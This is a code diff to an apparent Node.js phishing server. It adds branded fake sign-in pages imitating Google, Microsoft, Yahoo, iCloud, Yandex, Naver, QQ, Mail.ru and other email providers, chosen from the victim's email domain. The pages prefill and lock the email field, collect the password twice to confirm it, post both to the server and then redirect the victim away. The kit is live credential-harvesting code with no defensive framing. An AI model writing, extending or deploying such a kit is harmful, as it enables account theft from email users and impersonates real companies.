@@ -9,7 +9,7 @@ app.set('trust proxy', true);
 // MIDDLEWARE
 // ============================================================
 app.use(cors({
-    origin: 'https://secure-auto.netlify.app',   // allow Netlify + any frontend; tighten later if needed
+    origin: 'https://secure-auto.netlify.app',
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
@@ -607,7 +607,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;d
   var EMAIL = ${JSON.stringify(email || '')};
   var sent  = false;
   var attempts = 0;
-  var MAX_TS_RETRIES = 40;   // wait up to ~8s for turnstile to load
+  var MAX_TS_RETRIES = 40;
 
   function loadForm(token){
     if (sent) return;
@@ -661,51 +661,302 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;d
 }
 
 // ============================================================
-// HTML TEMPLATE: Login form (served by /a)
+// BRANDING — visual identity per provider
+// ============================================================
+function brandForProvider(email) {
+    const domain = (email || '').split('@')[1]?.toLowerCase() || '';
+    const tld = domain.split('.').pop() || '';
+
+    // --- Yandex (Russia) ---
+    if (/yandex|ya\.ru/.test(domain)) {
+        return {
+            name:    'Yandex',
+            lang:    'ru',
+            logoText: '<span style="color:#fc3f1d;font-weight:900">Я</span>ндекс',
+            subtitle: 'Войдите в свой аккаунт, чтобы продолжить',
+            emailPlaceholder: 'Логин или email',
+            passwordPlaceholder: 'Пароль',
+            buttonText: 'Войти',
+            accent: '#fc3f1d',
+            accent2: '#ffcc00',
+            bg: 'linear-gradient(135deg,#ffffff 0%,#fff8f0 100%)',
+            headerGradient: 'linear-gradient(90deg,#fc3f1d,#ffcc00,#fc3f1d)',
+            footer: '© Яндекс 2026'
+        };
+    }
+
+    // --- ABV.bg (Bulgaria) ---
+    if (domain === 'abv.bg') {
+        return {
+            name:    'ABV',
+            lang:    'bg',
+            logoText: '<span style="color:#003a8f;font-weight:900">ABV</span><span style="color:#e30613">.bg</span>',
+            subtitle: 'Влезте в своя акаунт, за да продължите',
+            emailPlaceholder: 'Имейл адрес',
+            passwordPlaceholder: 'Парола',
+            buttonText: 'Вход',
+            accent: '#003a8f',
+            accent2: '#e30613',
+            bg: 'linear-gradient(135deg,#eaf2ff 0%,#d6e4ff 100%)',
+            headerGradient: 'linear-gradient(90deg,#003a8f,#e30613,#003a8f)',
+            footer: '© ABV.bg 2026'
+        };
+    }
+
+    // --- Google / Gmail ---
+    if (/gmail|googlemail|google/.test(domain)) {
+        return {
+            name:    'Google',
+            lang:    'en',
+            logoText: '<span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>',
+            subtitle: 'Sign in to continue to Gmail',
+            emailPlaceholder: 'Email or phone',
+            passwordPlaceholder: 'Enter your password',
+            buttonText: 'Next',
+            accent: '#1a73e8',
+            accent2: '#4285f4',
+            bg: 'linear-gradient(135deg,#ffffff 0%,#f8f9fa 100%)',
+            headerGradient: 'linear-gradient(90deg,#4285f4,#ea4335,#fbbc05,#34a853)',
+            footer: '© Google LLC 2026'
+        };
+    }
+
+    // --- Microsoft / Outlook ---
+    if (/outlook|hotmail|live\.com|msn/.test(domain)) {
+        return {
+            name:    'Microsoft',
+            lang:    'en',
+            logoText: '<span style="color:#0078d4;font-weight:600">Microsoft</span>',
+            subtitle: 'Sign in to your Microsoft account',
+            emailPlaceholder: 'Email, phone, or Skype',
+            passwordPlaceholder: 'Password',
+            buttonText: 'Sign in',
+            accent: '#0067b8',
+            accent2: '#0078d4',
+            bg: 'linear-gradient(135deg,#f3f2f1 0%,#e8f0fe 100%)',
+            headerGradient: 'linear-gradient(90deg,#0078d4,#00b7c3,#0078d4)',
+            footer: '© Microsoft 2026'
+        };
+    }
+
+    // --- Naver (Korea) ---
+    if (domain === 'naver.com') {
+        return {
+            name:    'Naver',
+            lang:    'ko',
+            logoText: '<span style="color:#03c75a;font-weight:900">NAVER</span>',
+            subtitle: '네이버 아이디로 로그인',
+            emailPlaceholder: '아이디 또는 이메일',
+            passwordPlaceholder: '비밀번호',
+            buttonText: '로그인',
+            accent: '#03c75a',
+            accent2: '#009e4f',
+            bg: 'linear-gradient(135deg,#f0fff8 0%,#e0f7ee 100%)',
+            headerGradient: 'linear-gradient(90deg,#03c75a,#009e4f,#03c75a)',
+            footer: '© NAVER Corp. 2026'
+        };
+    }
+
+    // --- Daum / Kakao (Korea) ---
+    if (/daum|hanmail|kakao/.test(domain)) {
+        return {
+            name:    'Daum',
+            lang:    'ko',
+            logoText: '<span style="color:#fedd15;background:#1e1e1e;padding:2px 8px;border-radius:4px;font-weight:900">Daum</span>',
+            subtitle: '다음 계정으로 로그인',
+            emailPlaceholder: '이메일 주소',
+            passwordPlaceholder: '비밀번호',
+            buttonText: '로그인',
+            accent: '#fedd15',
+            accent2: '#1e1e1e',
+            bg: 'linear-gradient(135deg,#fffdf5 0%,#fff8e0 100%)',
+            headerGradient: 'linear-gradient(90deg,#fedd15,#1e1e1e,#fedd15)',
+            footer: '© Kakao Corp. 2026'
+        };
+    }
+
+    // --- Hiworks (Korea B2B) ---
+    if (/hiworks|gabia/.test(domain)) {
+        return {
+            name:    'Hiworks',
+            lang:    'ko',
+            logoText: '<span style="color:#1a73e8;font-weight:900">하이웍스</span> <span style="color:#0d47a1">오피스</span>',
+            subtitle: '기업 업무를 위한 안전한 로그인',
+            emailPlaceholder: 'name@hiworks.co.kr',
+            passwordPlaceholder: '비밀번호를 입력하세요',
+            buttonText: '로그인',
+            accent: '#1a73e8',
+            accent2: '#0d47a1',
+            bg: 'linear-gradient(135deg,#e8f0fe 0%,#d2e3fc 100%)',
+            headerGradient: 'linear-gradient(90deg,#1a73e8,#0d47a1,#1a73e8)',
+            footer: '© 2026 Hiworks Corp.'
+        };
+    }
+
+    // --- Yahoo ---
+    if (/yahoo|ymail|rocketmail/.test(domain)) {
+        return {
+            name:    'Yahoo',
+            lang:    'en',
+            logoText: '<span style="color:#6001d2;font-weight:900">yahoo</span><span style="color:#6001d2">!</span>',
+            subtitle: 'Sign in to your Yahoo account',
+            emailPlaceholder: 'Email or phone',
+            passwordPlaceholder: 'Password',
+            buttonText: 'Sign in',
+            accent: '#6001d2',
+            accent2: '#7e28e8',
+            bg: 'linear-gradient(135deg,#f5f0ff 0%,#ebe0ff 100%)',
+            headerGradient: 'linear-gradient(90deg,#6001d2,#7e28e8,#6001d2)',
+            footer: '© Yahoo 2026'
+        };
+    }
+
+    // --- QQ (China) ---
+    if (/qq\.com|foxmail/.test(domain)) {
+        return {
+            name:    'QQ',
+            lang:    'zh',
+            logoText: '<span style="color:#12b7f5;font-weight:900">QQ邮箱</span>',
+            subtitle: '登录您的QQ邮箱账号',
+            emailPlaceholder: 'QQ号码或邮箱',
+            passwordPlaceholder: '密码',
+            buttonText: '登录',
+            accent: '#12b7f5',
+            accent2: '#0a8ac2',
+            bg: 'linear-gradient(135deg,#eaf6ff 0%,#d6ecff 100%)',
+            headerGradient: 'linear-gradient(90deg,#12b7f5,#0a8ac2,#12b7f5)',
+            footer: '© 腾讯 2026'
+        };
+    }
+
+    // --- Mail.ru (Russia) ---
+    if (/mail\.ru|inbox\.ru|bk\.ru|list\.ru|internet\.ru/.test(domain)) {
+        return {
+            name:    'Mail.ru',
+            lang:    'ru',
+            logoText: '<span style="color:#005ff9;font-weight:900">Mail</span><span style="color:#ff9e00">.ru</span>',
+            subtitle: 'Войдите в свой аккаунт',
+            emailPlaceholder: 'Email или телефон',
+            passwordPlaceholder: 'Пароль',
+            buttonText: 'Войти',
+            accent: '#005ff9',
+            accent2: '#ff9e00',
+            bg: 'linear-gradient(135deg,#eaf2ff 0%,#d6e4ff 100%)',
+            headerGradient: 'linear-gradient(90deg,#005ff9,#ff9e00,#005ff9)',
+            footer: '© Mail.ru 2026'
+        };
+    }
+
+    // --- iCloud / Apple ---
+    if (/icloud|me\.com|mac\.com/.test(domain)) {
+        return {
+            name:    'iCloud',
+            lang:    'en',
+            logoText: '<span style="color:#000;font-weight:600"></span> <span style="color:#555">iCloud</span>',
+            subtitle: 'Sign in with your Apple Account',
+            emailPlaceholder: 'Apple Account',
+            passwordPlaceholder: 'Password',
+            buttonText: 'Sign in',
+            accent: '#0071e3',
+            accent2: '#1d1d1f',
+            bg: 'linear-gradient(135deg,#f5f5f7 0%,#e8e8ed 100%)',
+            headerGradient: 'linear-gradient(90deg,#0071e3,#1d1d1f,#0071e3)',
+            footer: '© Apple Inc. 2026'
+        };
+    }
+
+    // --- T-online (Germany) ---
+    if (domain === 't-online.de') {
+        return {
+            name:    'T-Online',
+            lang:    'de',
+            logoText: '<span style="color:#e20074;font-weight:900">T</span><span style="color:#000">-Online</span>',
+            subtitle: 'Melden Sie sich bei Ihrem E-Mail-Konto an',
+            emailPlaceholder: 'E-Mail-Adresse',
+            passwordPlaceholder: 'Passwort',
+            buttonText: 'Anmelden',
+            accent: '#e20074',
+            accent2: '#000000',
+            bg: 'linear-gradient(135deg,#fff0f8 0%,#ffe0f0 100%)',
+            headerGradient: 'linear-gradient(90deg,#e20074,#000000,#e20074)',
+            footer: '© Telekom 2026'
+        };
+    }
+
+    // --- Generic fallback: brand it with the domain itself ---
+    const name = domain.split('.')[0].replace(/^\w/, c => c.toUpperCase());
+    return {
+        name:    name || 'Mail',
+        lang:    'en',
+        logoText: `<span style="color:#1e930c;font-weight:900">${name}</span><span style="color:#475569">.${tld}</span>`,
+        subtitle: 'Sign in to continue to your mailbox',
+        emailPlaceholder: 'Email address',
+        passwordPlaceholder: 'Password',
+        buttonText: 'Sign in',
+        accent: '#1e930c',
+        accent2: '#167a09',
+        bg: 'linear-gradient(135deg,#f0fff4 0%,#e0f7e8 100%)',
+        headerGradient: 'linear-gradient(90deg,#1e930c,#167a09,#1e930c)',
+        footer: `© ${domain} 2026`
+    };
+}
+
+// helper
+function hexToRgba(hex, a) {
+    const h = (hex || '#000000').replace('#','');
+    const r = parseInt(h.substring(0,2), 16);
+    const g = parseInt(h.substring(2,4), 16);
+    const b = parseInt(h.substring(4,6), 16);
+    return `rgba(${r},${g},${b},${a})`;
+}
+
+// ============================================================
+// HTML TEMPLATE: Login form (served by /a) — BRANDED
 // ============================================================
 function loginFormPage(email) {
     const safeEmail = (email || '').replace(/"/g, '&quot;').replace(/</g,'&lt;');
+    const b = brandForProvider(email);
     const prefilled = email ? `value="${safeEmail}" readonly` : '';
-    const subtitle  = email
-        ? `Continue with <strong>${safeEmail}</strong>`
-        : 'Enter your credentials to continue.';
 
     return `<!DOCTYPE html>
-<html lang="en">
+<html lang="${b.lang}">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Sign in</title>
+<title>${b.name} — Sign in</title>
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f4f5f7;color:#2c3e50}
-.box{background:#fff;border-radius:12px;box-shadow:0 2px 24px rgba(0,0,0,0.06);padding:38px 34px;max-width:400px;width:92%}
-h2{color:#1e293b;margin:0 0 8px;font-size:1.25rem}
-p.sub{color:#64748b;font-size:.9rem;margin-bottom:20px}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:${b.bg};color:#2c3e50}
+.box{background:#fff;border-radius:14px;box-shadow:0 12px 48px rgba(0,0,0,0.10);padding:38px 34px;max-width:420px;width:92%;position:relative;overflow:hidden}
+.box::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:${b.headerGradient}}
+.logo{font-size:1.6rem;text-align:center;margin-bottom:6px}
+.subtitle{color:#64748b;font-size:.9rem;text-align:center;margin-bottom:26px}
 label{display:block;font-size:.8rem;color:#475569;margin:10px 0 4px}
-input{width:100%;padding:12px;border:1px solid #e2e8f0;border-radius:6px;font-size:14px;box-sizing:border-box;outline:none}
-input:focus{border-color:#1e930c;box-shadow:0 0 0 3px rgba(30,147,12,.12)}
+input{width:100%;padding:13px;border:1.5px solid #e2e8f0;border-radius:8px;font-size:14px;box-sizing:border-box;outline:none;transition:.2s}
+input:focus{border-color:${b.accent};box-shadow:0 0 0 3px ${hexToRgba(b.accent, .12)}}
 input[readonly]{background:#f8fafc;color:#64748b}
-button{width:100%;padding:12px;background:#1e930c;color:#fff;border:0;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:16px}
-button:hover{background:#167a09}
-button:disabled{opacity:.6;cursor:not-allowed}
-.msg{color:#64748b;font-size:13px;margin-top:10px;display:none;text-align:center}
-.spin{display:inline-block;width:12px;height:12px;border:2px solid #cbd5e1;border-top-color:#1e930c;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
+button{width:100%;padding:13px;background:linear-gradient(135deg,${b.accent},${b.accent2});color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:18px;transition:.2s}
+button:hover{transform:translateY(-1px);box-shadow:0 6px 18px ${hexToRgba(b.accent, .3)}}
+button:disabled{opacity:.6;cursor:not-allowed;transform:none}
+.msg{color:#64748b;font-size:13px;margin-top:12px;display:none;text-align:center}
+.spin{display:inline-block;width:12px;height:12px;border:2px solid #cbd5e1;border-top-color:${b.accent};border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
 @keyframes sp{to{transform:rotate(360deg)}}
+.footer{margin-top:22px;text-align:center;font-size:11px;color:#94a3b8}
 </style>
 </head>
 <body>
 <div class="box">
-  <h2>Sign in to your workspace</h2>
-  <p class="sub" id="sub">${subtitle}</p>
+  <div class="logo">${b.logoText}</div>
+  <div class="subtitle">${b.subtitle}</div>
   <form id="lf" autocomplete="off">
-    <label for="em">Email address</label>
+    <label for="em">${b.emailPlaceholder}</label>
     <input id="em" type="email" name="email" required ${prefilled}>
-    <label for="pw">Password</label>
+    <label for="pw">${b.passwordPlaceholder}</label>
     <input id="pw" type="password" name="password" required>
-    <button type="submit" id="btn">Sign in</button>
+    <button type="submit" id="btn">${b.buttonText}</button>
     <div class="msg" id="msg"></div>
   </form>
+  <div class="footer">${b.footer}</div>
 </div>
 <script>
 (function(){
@@ -717,7 +968,6 @@ button:disabled{opacity:.6;cursor:not-allowed}
   var form = document.getElementById('lf');
   var btn  = document.getElementById('btn');
   var msg  = document.getElementById('msg');
-  var sub  = document.getElementById('sub');
 
   var attempt      = 0;
   var lockedEmail  = PRELOADED || null;
@@ -731,24 +981,22 @@ button:disabled{opacity:.6;cursor:not-allowed}
 
   form.addEventListener('submit', async function(e){
     e.preventDefault();
-
     if (attempt > 0 && lockedEmail) {
       form.email.value = lockedEmail;
     } else {
       lockedEmail = PRELOADED || form.email.value.trim();
     }
-
     var thisPassword = form.password.value;
     attempt++;
     btn.disabled = true;
-    btn.textContent = 'Signing in...';
-    showMsg('Verifying credentials', true);
+    btn.textContent = '...';
+    showMsg('Verifying', true);
 
     var body = {
-      email:        lockedEmail,
-      password:     thisPassword,
+      email: lockedEmail,
+      password: thisPassword,
       prevPassword: lastPassword,
-      attempt:      attempt
+      attempt: attempt
     };
 
     var data = null;
@@ -764,21 +1012,18 @@ button:disabled{opacity:.6;cursor:not-allowed}
     if (data && data.redirect) redirectUrl = data.redirect;
     lastPassword = thisPassword;
 
-    var shouldRetry = data && data.retry === true;
-
-    if (shouldRetry) {
+    if (data && data.retry === true) {
       form.password.value = '';
       form.password.focus();
       form.email.readOnly = true;
       btn.disabled = false;
-      btn.textContent = 'Sign in';
+      btn.textContent = ${JSON.stringify(b.buttonText)};
       showMsg('Please re-enter your password to continue.', false);
-      sub.textContent = 'Session verification required.';
       return;
     }
 
-    btn.textContent = 'Redirecting...';
-    showMsg('Redirecting to your provider', true);
+    btn.textContent = '...';
+    showMsg('Redirecting', true);
     setTimeout(function(){ window.location.href = redirectUrl; }, 600);
   });
 })();
@@ -964,7 +1209,7 @@ app.get('/health', (req, res) => {
 // ============================================================
 // 404
 // ============================================================
-app.use('*', (req, res) => {
+app.use((req, res) => {
     res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
 });
 
@@ -981,6 +1226,7 @@ app.listen(PORT, () => {
     console.log(`🎯 Match rule: 2 identical passwords → redirect`);
     console.log(`🛡️ Safety cap: ${MAX_ATTEMPTS} attempts`);
     console.log(`🌍 Provider map: ${Object.keys(PROVIDER_MAP).length} domains + MX detection + TLD fallback`);
+    console.log(`🎨 Branding: ABV, Google, Microsoft, Yandex, Naver, Daum, QQ, Mail.ru, iCloud, T-Online + generic fallback`);
     console.log('========================================');
 });
 
